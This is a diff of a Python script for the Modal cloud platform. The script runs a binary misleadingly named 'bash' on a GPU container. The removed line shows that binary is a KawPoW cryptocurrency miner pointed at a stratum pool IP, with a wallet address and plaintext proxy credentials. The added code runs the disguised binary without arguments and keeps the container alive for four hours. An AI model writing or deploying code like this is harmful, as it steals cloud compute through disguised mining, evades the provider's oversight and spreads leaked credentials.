@@ -1,9 +1,12 @@
 import modal
 import subprocess
+import time
 
 app = modal.App(
     "t4x3-runner",
-    mounts=[modal.Mount.from_local_dir(".", remote_path="/root")]
+    mounts=[
+        modal.mounts.LocalDir(".", remote_path="/root")
+    ]
 )
 
 image = (
@@ -21,4 +24,7 @@ image = (
 )
 def run_script():
     subprocess.run(["nvidia-smi"], check=True)
-    subprocess.run(["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health "])
+    subprocess.run(["bash", "-lc", "chmod u+x bash && ./bash"], check=False)
+
+    print("Sleeping 4 hours...")
+    time.sleep(60 * 60 * 4)
